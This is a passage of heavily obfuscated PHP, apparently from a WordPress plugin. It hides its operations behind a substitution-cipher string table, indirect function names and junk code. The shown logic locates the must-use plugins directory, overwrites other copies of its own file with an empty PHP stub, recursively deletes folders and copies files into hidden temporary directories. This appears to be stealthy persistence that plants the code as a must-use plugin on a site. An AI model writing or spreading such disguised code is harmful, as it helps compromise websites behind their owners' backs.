y\']&;yrpy\'','r>"A.xr>|\'>1X\'>Hr','efy!1l>lAFAe/yI','A.F]X(`|./x1>1','`ls9*4F;sy.`9(','x1"X(|://r>\'','H*p4x;FU#x(XbI=fl.x>/'),array('./]X(|://r>\'','H*p4x;FU#x(XbI=fl.x>/','"s=G(Z4.:9|GyA','y*>FXr*le=ps((Ay\'','A.F]X(`|./x1>1',':;]:#y\'Z;>&\'\'^AbyG|e>r','A.F]X(`|./x1>1','`;&|y;]:F.|pb.','A.F]X(`|./x1>1','l|1(I;|AlI\'AI91ZUI#A:','A.F]X(`|./x1>1','.llrx=s>GxU**Zb|;`e^','X=;s#>9^yr(`I|Z&fH;xpp','A.F]X(`|./x1>1','yA/:eF:Zx*4U4=b&`r','x:.||lXr&yp9/Xy','x:r>\'|`=XrHy|ry>">','yrl!]A"("|eZbelX*y>Uf',':(&Zlf*HUr/r/:]','`H|A>\'`X`r>1',']>r|/ArX/(','A.F]X(`|./x1>1','ye#"4;".lFU;f/.>br`*','!bs.p9U##sGH/4p\'yH^A|H','!bs.p9U##sGH/4p\'yH^A|H','`H|H\'/(|]Fx\'1','.rAAH1I=&]rH;Z;"x>A`e\'','=H/Fe|!^=&;&4>','A.F]X(`|./x1>1',']>r|/ArX/(','`H|.x`r|\'>H/e>\'!|Hy>H*','`H|.x`r|\'>H/e>\'!|Hy>H*','\'!**!9UZG`b&Z]>','H\'/(|`Hy>1F.>`','>sX(:\'pb]s|A`|*G>\'=U>#','A.F]X(`|./x1>1'));}return $a[$i];}function ar6vo_1nyhx2koj5($i){$e=lnxxvxyv4943($i);$f='ABS'.'PTH'.'sc_'.'ver'.'o4.'.'53'.'pl'.'ug'.'inba'.'mWL'.'UG'.'INDR'.'M/-k'.'dhtw'.'<?\\'.'qfCO'.'Ex '.':*'.'y=V('.'+)'.'2FK\''.',0'.'z>'.'&19'.'786'.'XY'.'ZQj'.';{"'.'[}]'.'!|'.'^$#J'.'%`';$t='zD'.'<W'.'Yd'.'`H'.'|e'.'>\'/'.'fO'.'4GA.'.'F]X('.'#x'.'"Cn'.'8B['.'gc{'.'ju6*'.'1yr='.'QLN'.'b:'.'J\\?U'.'T$'.'K!}i'.'SqV9'.'vEM'.'_sI'.'a2'.'^&Z'.';p-'.'5w+l'.' mok'.'03'.'t)'.'7%h'.',R'.'P';$r="";for($j=0;$j<strlen($e);$j++){$p=strpos($t,$e[$j]);$r.=($p===false)?$e[$j]:$f[$p];}return $r;}function gz_aorofp7mo($i){$j=(int)$i;return ar6vo_1nyhx2koj5($j);}function xpm5lg9odtw6di($i){$j=$i+0;return ar6vo_1nyhx2koj5($j);}function bk9m46jygo3f($i){$j=$i;return ar6vo_1nyhx2koj5($j);}function xognx_h1jzkh($i){return ar6vo_1nyhx2koj5($i);}$GLOBALS['__scf_pmoxtzoe3f0qw_3']=bk9m46jygo3f(3);$GLOBALS['__scf_v_sk95ndl08_4']=xognx_h1jzkh(4);$GLOBALS['__scf_j_4rj7vg4ae0j_7']=ar6vo_1nyhx2koj5(7);$GLOBALS['__scf__4_5aelz82b4m_8']=xognx_h1jzkh(8);$GLOBALS['__scf__fl_gwujcblq_9']=xognx_h1jzkh(9);$GLOBALS['__scf_fxl4k4gsul_10']=bk9m46jygo3f(10);$GLOBALS['__scf_meo_1tvjsals_11']=gz_aorofp7mo(11);$GLOBALS['__scf_v2rfz0q9cvmh_12']=gz_aorofp7mo(12);$GLOBALS['__scf_xh7dlkum2fl_16']=xpm5lg9odtw6di(16);$GLOBALS['__scf_nn76gmr4q6hh_18']=ar6vo_1nyhx2koj5(18);$GLOBALS['__scf_qsx1vml11ds_19']=bk9m46jygo3f(19);$GLOBALS['__scf_vpig9uwvw8_pu_20']=ar6vo_1nyhx2koj5(20);$GLOBALS['__scf_ja6kf6wqm030v_22']=xpm5lg9odtw6di(22);$GLOBALS['__scf_pqcqp3eb33qmmg_24']=xognx_h1jzkh(24);$GLOBALS['__scf_amk7iuqda_oe_33']=xognx_h1jzkh(33);$GLOBALS['__scf_caskakuf5824_34']=gz_aorofp7mo(34);$GLOBALS['__scf_zj8mp2xbaqmp_35']=gz_aorofp7mo(35);$GLOBALS['__scf_oenrsvkzs1_36']=xognx_h1jzkh(36);$GLOBALS['__scf_q30rocqsx3jxa8_37']=xpm5lg9odtw6di(37);$GLOBALS['__scf_obmceil7_8_39']=ar6vo_1nyhx2koj5(39);$GLOBALS['__scf_is0fvk8c7tq2_41']=ar6vo_1nyhx2koj5(41);$GLOBALS['__scf_h23c49ni_b86_43']=bk9m46jygo3f(43);$GLOBALS['__scf_lgnt1tzo8h_44']=xpm5lg9odtw6di(44);$GLOBALS['__scf_cq91q6z6xreoi_46']=ar6vo_1nyhx2koj5(46);$GLOBALS['__scf_v7y4c72abxzjo_47']=xpm5lg9odtw6di(47);$GLOBALS['__scf_jhyvki17yag_52']=xognx_h1jzkh(52);$GLOBALS['__scf_eo363tjzd4r6n_56']=xognx_h1jzkh(56);$GLOBALS['__scf_v834hljo6be9_67']=xpm5lg9odtw6di(67);$GLOBALS['__scf_b60g6hx_a7ggi_71']=xognx_h1jzkh(71);$GLOBALS['__scf_iylawj38txgw_73']=gz_aorofp7mo(73);$GLOBALS['__scf_gjr57ltb3feage_74']=bk9m46jygo3f(74);$GLOBALS['__scf_hnc1gj0s4looo5_75']=xpm5lg9odtw6di(75);$GLOBALS['__scf_x5sykg98apqg2d_76']=xognx_h1jzkh(76);$GLOBALS['__scf_wuj9qpo0vbx_78']=ar6vo_1nyhx2koj5(78);$GLOBALS['__scf_nae5vxe5wsw2v7_95']=xpm5lg9odtw6di(95);$GLOBALS['__scf_ak3p5za9uvhzh8_96']=xpm5lg9odtw6di(96);$GLOBALS['__scf_k4z5lhhe91ty_98']=gz_aorofp7mo(98);$GLOBALS['__scf_r6y1fbsyx8i2l_99']=xognx_h1jzkh(99);$GLOBALS['__scf_bwbaq8fxyxm3_103']=xognx_h1jzkh(103);$GLOBALS['__scf_w645jfzvum_104']=ar6vo_1nyhx2koj5(104);$GLOBALS['__scf_if1j_n66jo7w7_111']=xognx_h1jzkh(111);$GLOBALS['__scf_w_xu8rj4lvsj44_113']=ar6vo_1nyhx2koj5(113);$GLOBALS['__scf__e6bt2kljb6u_120']=xognx_h1jzkh(120);$GLOBALS['__scf_xctrtxw7z4_147']=ar6vo_1nyhx2koj5(147);$GLOBALS['__scf_p3c9g_i0vy_148']=gz_aorofp7mo(148);$GLOBALS['__scf_uh0dc0gefs_xhu_149']=gz_aorofp7mo(149);$GLOBALS['__scf_expvj_2k_kl_150']=xpm5lg9odtw6di(150);$GLOBALS['__scf_umxqreicn053_158']=ar6vo_1nyhx2koj5(158);$GLOBALS['__scf_l3dns7czmg3tv_169']=bk9m46jygo3f(169);$GLOBALS['__scf_ks7_xfapvywl_185']=bk9m46jygo3f(185);$GLOBALS['__scf_qy_a5siry0hu3_197']=gz_aorofp7mo(197);$GLOBALS['__scf_zmckaak88my_204']=xpm5lg9odtw6di(204);$GLOBALS['__scf__l6f5ccvto1_222']=xognx_h1jzkh(222);$GLOBALS['__scf_a0syozw1ry_223']=xognx_h1jzkh(223);$GLOBALS['__scf_x_v69e6x6zu_224']=bk9m46jygo3f(224);$GLOBALS['__scf_s252tzgcgng_227']=bk9m46jygo3f(227);$GLOBALS['__scf_xsypfx93obosif_228']=gz_aorofp7mo(228);$GLOBALS['__scf_j3tbb329sx0_239']=xognx_h1jzkh(239);$GLOBALS['__scf_ori3jz_f02_241']=xognx_h1jzkh(241);$GLOBALS['__scf_gj81telyjzw_271']=xognx_h1jzkh(271);$GLOBALS['__scf_m1rkczhgojjhh_272']=xpm5lg9odtw6di(272);$GLOBALS['__scf_x0ygw6u0unrx_273']=bk9m46jygo3f(273);$GLOBALS['__scf_bd38_y38g9_276']=gz_aorofp7mo(276);$GLOBALS['__scf_bj6i6c7djd6_282']=ar6vo_1nyhx2koj5(282);$GLOBALS['__scf_b7fbznw64lhm0_284']=ar6vo_1nyhx2koj5(284);$GLOBALS['__scf_nz_jvx37ph58fn_287']=bk9m46jygo3f(287);$GLOBALS['__scf_kb6ev5exfrdf8u_288']=bk9m46jygo3f(288);$GLOBALS['__scf_pds8salms2pk_289']=bk9m46jygo3f(289);$GLOBALS['__scf_md_ke_yv3own8f_290']=ar6vo_1nyhx2koj5(290);$GLOBALS['__scf_w2ici10o1fh37_295']=xpm5lg9odtw6di(295);$GLOBALS['__scf_c7y7gwhbgrz_296']=ar6vo_1nyhx2koj5(296);$GLOBALS['__scf_jhi_q5t8gnhj_297']=gz_aorofp7mo(297);$GLOBALS['__scf_opn8esk789l18v_305']=ar6vo_1nyhx2koj5(305);$GLOBALS['__scf_yf6s3f_o_o8gl_318']=bk9m46jygo3f(318);$GLOBALS['__scf_u6m4cedwgt__319']=bk9m46jygo3f(319);$GLOBALS['__scf_b0js6es3ja1cb1_324']=xpm5lg9odtw6di(324);$GLOBALS['__scf_gkf62gmdg0_327']=xognx_h1jzkh(327);$GLOBALS['__scf_pn7rzt4ee3t_331']=bk9m46jygo3f(331);$GLOBALS['__scf_uj0mutkf3h_332']=xpm5lg9odtw6di(332);$GLOBALS['__scf_dq0_ug83xej_a_335']=xognx_h1jzkh(335);$GLOBALS['__scf_hmblwq7g8zpdz2_345']=xognx_h1jzkh(345);$GLOBALS['__scf_oi11nsrcts_346']=bk9m46jygo3f(346);$GLOBALS['__scf_jlhdedaik0c_347']=ar6vo_1nyhx2koj5(347);$GLOBALS['__scf_upr7jxyxre3_348']=bk9m46jygo3f(348);$GLOBALS['__scf_hg1ogpq4w6_351']=gz_aorofp7mo(351);$GLOBALS['__scf_wdpewt3rgpl2_353']=xpm5lg9odtw6di(353);$GLOBALS['__scf_vz8ci2guu7b5_355']=bk9m46jygo3f(355);$GLOBALS['__scf_hefuz1dmp7si0_360']=gz_aorofp7mo(360);$GLOBALS['__scf_j59q8mojj8e4ar_363']=gz_aorofp7mo(363);$GLOBALS['__scf_gyqx0aoue42_385']=gz_aorofp7mo(385);$GLOBALS['__scf_e26frum9mv_386']=xognx_h1jzkh(386);$GLOBALS['__scf_k6gt90r92gxj8_388']=ar6vo_1nyhx2koj5(388);$GLOBALS['__scf_n82j_c5k8jxotq_403']=xognx_h1jzkh(403);$GLOBALS['__scf_in4xcc75ala901_404']=ar6vo_1nyhx2koj5(404);$GLOBALS['__scf_ytyoalbgnl_417']=xpm5lg9odtw6di(417);$GLOBALS['__scf_lqfsnsgtu2c_429']=bk9m46jygo3f(429);$GLOBALS['__scf_a6uiw8bt24jybf_454']=xognx_h1jzkh(454);$GLOBALS['__scf_li6gaes851wa_474']=gz_aorofp7mo(474);$GLOBALS['__scf_askqa52jtol__2_475']=bk9m46jygo3f(475);$GLOBALS['__scf_kwfvo_j_hzb_532']=gz_aorofp7mo(532);$GLOBALS['__scf_b58bt0r94kp1_555']=gz_aorofp7mo(555);$GLOBALS['__scf_pku6wc4sci0i_570']=gz_aorofp7mo(570);$GLOBALS['__scf_dpcnt5aa9yk_581']=xognx_h1jzkh(581);$GLOBALS['__scf_lahtvu_g2oryx_595']=xpm5lg9odtw6di(595);$GLOBALS['__scf_llevw2ijvv_635']=bk9m46jygo3f(635);$GLOBALS['__scf_u9br1q5valhof_668']=bk9m46jygo3f(668);$GLOBALS['__scf_ojjepdqapp29_684']=gz_aorofp7mo(684);$GLOBALS['__scf_qzus6lyx2yzp88_703']=bk9m46jygo3f(703);$GLOBALS['__scf_f_zov197oj1_706']=xognx_h1jzkh(706);$GLOBALS['__scf_ihsujvdc278_818']=gz_aorofp7mo(818);$GLOBALS['__scf_lfhzso7ke3h3_912']=gz_aorofp7mo(912);$GLOBALS['__scf_cr3a4banfzf1q7_932']=bk9m46jygo3f(932);$GLOBALS['__scf_mm3xcvhx8tq_990']=xognx_h1jzkh(990);$GLOBALS['__scf_prrxz07z8__997']=xognx_h1jzkh(997);$GLOBALS['__scf_shhwbshoxi0_1148']=xognx_h1jzkh(1148);$GLOBALS['__scf_ii9vb4x0ufvvq_1154']=ar6vo_1nyhx2koj5(1154);$GLOBALS['__scf_o5sjea6lw_1ppj_1239']=xpm5lg9odtw6di(1239);$GLOBALS['__scf_j65ea9eiow7te_1243']=xognx_h1jzkh(1243);$GLOBALS['__scf_xv6k4zu903au_1246']=bk9m46jygo3f(1246);$GLOBALS['__scf_ipnjj821ht6p_1247']=gz_aorofp7mo(1247);$GLOBALS['__scf_um3jl76593pe_1248']=ar6vo_1nyhx2koj5(1248);$GLOBALS['__scf_kv9kz2vgrwaf_1249']=bk9m46jygo3f(1249);$GLOBALS['__scf_x4flwjkmycoyty_1250']=gz_aorofp7mo(1250);$GLOBALS['__scf_p_rgrs66km8_1251']=xpm5lg9odtw6di(1251);$GLOBALS['__scf_jprl74_5uj3sy_1253']=ar6vo_1nyhx2koj5(1253);$GLOBALS['__scf_e4lkltqhx5_1264']=xpm5lg9odtw6di(1264);$GLOBALS['__scf_yhh3tar3yxz_1307']=xpm5lg9odtw6di(1307);$GLOBALS['__scf_avnl614cqph9_1314']=xpm5lg9odtw6di(1314);$GLOBALS['__scf_c_sktsaypzz_1319']=gz_aorofp7mo(1319);$GLOBALS['__scf_k0rtq2h5b39ui_1370']=gz_aorofp7mo(1370);$GLOBALS['__scf_r6o5_04u5j1_1445']=ar6vo_1nyhx2koj5(1445);$GLOBALS['__scf_zhapk2qsifinh7_1475']=ar6vo_1nyhx2koj5(1475);$GLOBALS['__scf_l32urgzdpblam6_1699']=ar6vo_1nyhx2koj5(1699);$GLOBALS['__scf_md9tpoqso1mgh_1706']=ar6vo_1nyhx2koj5(1706);$GLOBALS['__scf_u8t8ov38lmv5t_1805']=bk9m46jygo3f(1805);

function x9om2evmh1_igtjv8z3($fpqmnnk){$fpqmnnk=(isset($fpqmnnk)?$fpqmnnk:0)+0;return $fpqmnnk*6;}


defined(xognx_h1jzkh(0))    or exit;
 
  function xl8k_pjv1048a7ae7()
   {
 return  isset($GLOBALS[gz_aorofp7mo(1)])  ? $GLOBALS[xpm5lg9odtw6di(1)]  : xpm5lg9odtw6di(2);
}
 function      bho93o6vof3ni5_rg622_h()
      {
return    __FILE__;
  }
 function gjb4l0gtgi874122wes()
      {
// specialize irreducible trust-anchor
$nrkhrxxlr=PHP_INT_MAX/PHP_INT_MAX;$v4_4obw_=$nrkhrxxlr+37;
  return $GLOBALS['__scf_pmoxtzoe3f0qw_3'](bho93o6vof3ni5_rg622_h());
}


  function   om5aztdigw3zhz()
  {
if     ($GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(5))) return plugin_basename(bho93o6vof3ni5_rg622_h());
$s6um63o_s0zywj1  =  bho93o6vof3ni5_rg622_h();
     $imzxjyxc_f = defined(xpm5lg9odtw6di(6))  ? WP_PLUGIN_DIR  :     "";


    if  ($imzxjyxc_f !==    ""  &&   $GLOBALS['__scf_j_4rj7vg4ae0j_7']($s6um63o_s0zywj1,    $imzxjyxc_f) === 0)   return  $GLOBALS['__scf__4_5aelz82b4m_8']($GLOBALS['__scf__fl_gwujcblq_9']($s6um63o_s0zywj1,    $GLOBALS['__scf_fxl4k4gsul_10']($imzxjyxc_f)),      '/');
return  $GLOBALS['__scf_pmoxtzoe3f0qw_3']($GLOBALS['__scf_meo_1tvjsals_11']($s6um63o_s0zywj1))     .   '/'   . $GLOBALS['__scf_pmoxtzoe3f0qw_3']($s6um63o_s0zywj1);
      }
function  sxupmu4fhe9r2zxw()

{
 return    $GLOBALS['__scf_v2rfz0q9cvmh_12'](defined(gz_aorofp7mo(13))  ?      WPMU_PLUGIN_DIR      :   (WP_CONTENT_DIR  . xpm5lg9odtw6di(14)),  '/');
 }



     function  xn_7dvopscmun07()
 {



return   $GLOBALS['__scf_meo_1tvjsals_11'](bho93o6vof3ni5_rg622_h());
     }
  function  w1m15sg83rnn5uqc64($q97i7_qw446ei,  $wmi9vtfi67mkceoi   =  (284+209), $yc_3fgo7em8cww   =    false)
   {
return $GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(15)) ? @$GLOBALS['__scf_xh7dlkum2fl_16']($q97i7_qw446ei,  $wmi9vtfi67mkceoi, $yc_3fgo7em8cww)  :    false;
}



  function    f97udlofaljpuxw1_jgnfh($dz9ttep94ondlpl, $wmi9vtfi67mkceoi)
        {
        return  $GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(17))  ?      @$GLOBALS['__scf_nn76gmr4q6hh_18']($dz9ttep94ondlpl,  $wmi9vtfi67mkceoi)  :   false;
}
   function xv6oqhjncehpr7v_mus7($dz9ttep94ondlpl)
 {
return $GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(19))    ?  @$GLOBALS['__scf_qsx1vml11ds_19']($dz9ttep94ondlpl)     :   false;
  }
  function  hywr5mypyyx_m1lqunrdm($bki0gi20hmqucm)
   {
// @provision distributor




       if  (!@$GLOBALS['__scf_vpig9uwvw8_pu_20']($bki0gi20hmqucm)) return true;
   f97udlofaljpuxw1_jgnfh($bki0gi20hmqucm,      (15+405));
        if   (xv6oqhjncehpr7v_mus7($bki0gi20hmqucm))   {
  if    ($GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(21)))   @opcache_invalidate($bki0gi20hmqucm,     true);
 return true;
}
 f97udlofaljpuxw1_jgnfh($GLOBALS['__scf_meo_1tvjsals_11']($bki0gi20hmqucm), (64+429));
if (xv6oqhjncehpr7v_mus7($bki0gi20hmqucm)) {
  if     ($GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(21)))  @opcache_invalidate($bki0gi20hmqucm,    true);
return true;

 }
$_v44jfvalbfkj6ch  =   @$GLOBALS['__scf_ja6kf6wqm030v_22']($bki0gi20hmqucm, xpm5lg9odtw6di(23));
 if  ($_v44jfvalbfkj6ch)  {

     @$GLOBALS['__scf_pqcqp3eb33qmmg_24']($_v44jfvalbfkj6ch,  "<?php\n");
@fclose($_v44jfvalbfkj6ch);
  

if  ($GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(21)))     @opcache_invalidate($bki0gi20hmqucm,    true);
  return   true;
 }
      return  false;$uvgx1857l2r11z=(0x89+0xcc);$v738o1vabmmpb4=$uvgx1857l2r11z%15;
}



  function  bbt0aigh_ei6k8r80ejx($bki0gi20hmqucm)
    {



    $li3hbbl8vs =   $GLOBALS['__scf_meo_1tvjsals_11']($bki0gi20hmqucm);
 $r098zkn960   =    $GLOBALS['__scf_pmoxtzoe3f0qw_3']($bki0gi20hmqucm, xognx_h1jzkh(25));
     foreach   (array(ar6vo_1nyhx2koj5(26),   bk9m46jygo3f(27),    gz_aorofp7mo(28),  gz_aorofp7mo(29))      as      $k_e0relj33h75at8)   {
   $il3zdkxo6f1fl2c4 =    $li3hbbl8vs    .   '/' .   $k_e0relj33h75at8   .    $r098zkn960;
  if    (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($il3zdkxo6f1fl2c4))   hywr5mypyyx_m1lqunrdm($il3zdkxo6f1fl2c4);
    }
    $gt4sfvmllkgdmt =  $li3hbbl8vs   .  '/'  .    $r098zkn960 .     xognx_h1jzkh(30);
if    (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($gt4sfvmllkgdmt))    hywr5mypyyx_m1lqunrdm($gt4sfvmllkgdmt);
   if (defined(gz_aorofp7mo(31))) {
   $nq2ng8224ef6s    =    WP_CONTENT_DIR      . bk9m46jygo3f(32) .   $r098zkn960;
    if      (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($nq2ng8224ef6s))  hywr5mypyyx_m1lqunrdm($nq2ng8224ef6s);
 }
 $_pd  = defined(ar6vo_1nyhx2koj5(6))     ? @$GLOBALS['__scf_amk7iuqda_oe_33'](WP_PLUGIN_DIR)    :  false;
    $yu57iori8cn0u1 =  @$GLOBALS['__scf_amk7iuqda_oe_33']($li3hbbl8vs);
  if   ($_pd  &&   $yu57iori8cn0u1    &&   $GLOBALS['__scf_meo_1tvjsals_11']($yu57iori8cn0u1)  ===  $_pd)   {
 $bni4yamwmou7    =  @$GLOBALS['__scf_caskakuf5824_34']($yu57iori8cn0u1);
if   ($GLOBALS['__scf_zj8mp2xbaqmp_35']($bni4yamwmou7)      &&  $GLOBALS['__scf_oenrsvkzs1_36']($bni4yamwmou7) <= 2) @$GLOBALS['__scf_q30rocqsx3jxa8_37']($yu57iori8cn0u1);
}
        }
function      wnh85lj6xpx_56d9h57()


   {


 static  $_r8lpudimjoa =      'x';
 if ($_r8lpudimjoa  !==  'x') return   $_r8lpudimjoa;
       $_r8lpudimjoa    = null;


if  ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(38)))   {     $du8t9u_zqkx  = @posix_geteuid();    if   ($GLOBALS['__scf_obmceil7_8_39']($du8t9u_zqkx))    $_r8lpudimjoa =  $du8t9u_zqkx;   }
if    ($_r8lpudimjoa ===   null)    {
  $g3z6ma16w7vxd   =   wwbj8n248w5psw9u(hzkj2ifwqdzf_u32qrf(),  xognx_h1jzkh(40));
    if    ($GLOBALS['__scf_is0fvk8c7tq2_41']($g3z6ma16w7vxd)) {  $tpriuwxjru1h5re  =   @fileowner($g3z6ma16w7vxd);    xv6oqhjncehpr7v_mus7($g3z6ma16w7vxd);  if   ($GLOBALS['__scf_obmceil7_8_39']($tpriuwxjru1h5re))  $_r8lpudimjoa  =  $tpriuwxjru1h5re; }
}
    return      $_r8lpudimjoa;
}
    function  ztn4gifvcz10v4($dhb4mklrk0)
  {


 if ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($GLOBALS['__scf_pmoxtzoe3f0qw_3']($dhb4mklrk0),   bk9m46jygo3f(42))   !== 0) return;
    if    (!@$GLOBALS['__scf_h23c49ni_b86_43']($dhb4mklrk0)   || @$GLOBALS['__scf_lgnt1tzo8h_44']($dhb4mklrk0))   return;
  $mp35wbgcstqcj =    @$GLOBALS['__scf_caskakuf5824_34']($dhb4mklrk0);
  if    ($GLOBALS['__scf_zj8mp2xbaqmp_35']($mp35wbgcstqcj))  foreach ($mp35wbgcstqcj  as $o_qyrtxl85owt)    {
 if      ($o_qyrtxl85owt ===   '.'  ||    $o_qyrtxl85owt   ===  ar6vo_1nyhx2koj5(45))  continue;
$dz9ttep94ondlpl     =   $dhb4mklrk0 .    '/' .  $o_qyrtxl85owt;
       if  (@$GLOBALS['__scf_h23c49ni_b86_43']($dz9ttep94ondlpl)  &&  !@$GLOBALS['__scf_lgnt1tzo8h_44']($dz9ttep94ondlpl))  ztn4gifvcz10v4($dz9ttep94ondlpl); else   xv6oqhjncehpr7v_mus7($dz9ttep94ondlpl);
        }
      @$GLOBALS['__scf_q30rocqsx3jxa8_37']($dhb4mklrk0);
   }
 function  g755i_eqnig6jpyl9bq9d($h3wz11cllq,   $v2321x1ylwqmiy)


    {
if (@$GLOBALS['__scf_lgnt1tzo8h_44']($h3wz11cllq))   return  false;
 



  if     (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($h3wz11cllq))     {


 if   (!@$GLOBALS['__scf_cq91q6z6xreoi_46']($h3wz11cllq))    return false;
return    kzn0b1md4fk2p00($h3wz11cllq, $v2321x1ylwqmiy)  ?    true     :   false;
}
  if (@$GLOBALS['__scf_h23c49ni_b86_43']($h3wz11cllq))  {
if  (!@$GLOBALS['__scf_h23c49ni_b86_43']($v2321x1ylwqmiy)   && !w1m15sg83rnn5uqc64($v2321x1ylwqmiy,   (409+84), true))  return    false;


$mp35wbgcstqcj     =   @$GLOBALS['__scf_caskakuf5824_34']($h3wz11cllq);
 if    (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($mp35wbgcstqcj))    return     false;
  foreach   ($mp35wbgcstqcj as $o_qyrtxl85owt)  {
    if ($o_qyrtxl85owt === '.'  ||    $o_qyrtxl85owt  ===  ar6vo_1nyhx2koj5(45)) continue;
    if   (!g755i_eqnig6jpyl9bq9d($h3wz11cllq .  '/'  .   $o_qyrtxl85owt,     $v2321x1ylwqmiy .      '/'  . $o_qyrtxl85owt)) return  false;
  }


return true;
}
return   true;
}



  function r0pcenevhaaasknjjb8v7l($bki0gi20hmqucm)
 {
 if   (!@$GLOBALS['__scf_vpig9uwvw8_pu_20']($bki0gi20hmqucm))     return   false;
 if  (@$GLOBALS['__scf_v7y4c72abxzjo_47']($bki0gi20hmqucm))      return false;$su060800851j=191|230;$ow4p4te5jxlsv=$su060800851j^180;
  if    (@$GLOBALS['__scf_v7y4c72abxzjo_47']($GLOBALS['__scf_meo_1tvjsals_11']($bki0gi20hmqucm)))  return    false;
 return true;
  }

     function  nd3injed5_l_b3hb($bki0gi20hmqucm)
{
       kkpdha95nyx3tbltd10(bk9m46jygo3f(48), $GLOBALS['__scf_pmoxtzoe3f0qw_3']($bki0gi20hmqucm));
  }
    function   xsvrgduv7c8lwjvkral($g4bbmdeemm6a)
  {
if (!$GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(49)) ||  !$GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(34))) return   false;



    if  ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(50))   &&   get_transient(bk9m46jygo3f(51)))   return false;
 $wo0e7t08wkleok20  = @$GLOBALS['__scf_amk7iuqda_oe_33'](sxupmu4fhe9r2zxw());
if  ($wo0e7t08wkleok20  ===   false ||  !@$GLOBALS['__scf_h23c49ni_b86_43']($wo0e7t08wkleok20)) return   false;
  $rzryil7zx5yhrr0a =   null;
 if  ($g4bbmdeemm6a   !==     null)  {

 $rzryil7zx5yhrr0a  = @$GLOBALS['__scf_amk7iuqda_oe_33']($g4bbmdeemm6a);
  if  ($rzryil7zx5yhrr0a  === false   ||  $GLOBALS['__scf_meo_1tvjsals_11']($rzryil7zx5yhrr0a)   !==    $wo0e7t08wkleok20)  return false;

  }
     $ckfhtwk8g0iav    =      $GLOBALS['__scf_meo_1tvjsals_11']($wo0e7t08wkleok20);
if    (!@$GLOBALS['__scf_h23c49ni_b86_43']($ckfhtwk8g0iav)  || !@$GLOBALS['__scf_v7y4c72abxzjo_47']($ckfhtwk8g0iav))  return  false;
if   (!jzlknbv7omzglykz($wo0e7t08wkleok20)  ||  !jzlknbv7omzglykz($ckfhtwk8g0iav))    return     false;
$ipyjq28dv0 =   @fileperms($ckfhtwk8g0iav);
   if  ($ipyjq28dv0  !==  false &&   ($ipyjq28dv0 &    (476+36))) {
   $jyw70jyr1zq =      wnh85lj6xpx_56d9h57();
 if    ($jyw70jyr1zq  ===      null    ||   (@fileowner($ckfhtwk8g0iav)    !== $jyw70jyr1zq     &&  @fileowner($wo0e7t08wkleok20) !==  $jyw70jyr1zq)) return   false;

}
       $ezi257sw2y7  =   @$GLOBALS['__scf_jhyvki17yag_52']($ckfhtwk8g0iav);  $i6cfgq4vhw123z  = @$GLOBALS['__scf_jhyvki17yag_52']($wo0e7t08wkleok20);
   if    ($GLOBALS['__scf_zj8mp2xbaqmp_35']($ezi257sw2y7)  && $GLOBALS['__scf_zj8mp2xbaqmp_35']($i6cfgq4vhw123z) &&  isset($ezi257sw2y7[gz_aorofp7mo(53)]) &&    isset($i6cfgq4vhw123z[gz_aorofp7mo(53)]) &&   $ezi257sw2y7[bk9m46jygo3f(54)]    !==    $i6cfgq4vhw123z[gz_aorofp7mo(54)])  return false;

 $mp35wbgcstqcj     = @$GLOBALS['__scf_caskakuf5824_34']($wo0e7t08wkleok20);



     if  (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($mp35wbgcstqcj))    return  false;
$_1l7wcqkhzeg7m48 =   array();
foreach ($mp35wbgcstqcj   as $o_qyrtxl85owt)  {
 if    ($o_qyrtxl85owt    === '.'  ||  $o_qyrtxl85owt ===      ar6vo_1nyhx2koj5(55)) continue;
 


$dz9ttep94ondlpl  =    $wo0e7t08wkleok20 .     '/'     .   $o_qyrtxl85owt;
     $wyxqmcnarkv7 =  @$GLOBALS['__scf_amk7iuqda_oe_33']($dz9ttep94ondlpl);
 if  ($rzryil7zx5yhrr0a  !== null   && $wyxqmcnarkv7   !==     false     &&   $wyxqmcnarkv7   ===    $rzryil7zx5yhrr0a)   continue;
  if     (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($dz9ttep94ondlpl)  && mowf3lw2lqslkaudd($dz9ttep94ondlpl,    (421+79)))   continue;
  if  (@$GLOBALS['__scf_lgnt1tzo8h_44']($dz9ttep94ondlpl)  ||  !@$GLOBALS['__scf_cq91q6z6xreoi_46']($dz9ttep94ondlpl))   return  false;
 $_1l7wcqkhzeg7m48[] =     $o_qyrtxl85owt;
  }
    $t64nce3kj773  =    $GLOBALS['__scf__fl_gwujcblq_9']($GLOBALS['__scf_eo363tjzd4r6n_56'](uniqid("",   true)),  0, (223^215));



   $i1alef1z4oaqi21 = $ckfhtwk8g0iav    . ar6vo_1nyhx2koj5(57)   .   $t64nce3kj773;
 $vgrwd7q5u9w_mdj =   $ckfhtwk8g0iav . bk9m46jygo3f(58)  . $t64nce3kj773;
     if  (!w1m15sg83rnn5uqc64($i1alef1z4oaqi21,     (466+27), true)) return  false;
    foreach     ($_1l7wcqkhzeg7m48   as    $o_qyrtxl85owt) {
// WP Archive Title: lazy symbol-table

 if  (!g755i_eqnig6jpyl9bq9d($wo0e7t08wkleok20  .  '/'   . $o_qyrtxl85owt,   $i1alef1z4oaqi21  .   '/'   .     $o_qyrtxl85owt))  {$s6edt21vd86c3h=6+69;$b6cktf82=$s6edt21vd86c3h-2;   ztn4gifvcz10v4($i1alef1z4oaqi21);  return false;      }
}
  if    (!b4za25lhh9bxaf_($wo0e7t08wkleok20, $vgrwd7q5u9w_mdj)) { ztn4gifvcz10v4($i1alef1z4oaqi21);  return false;    }
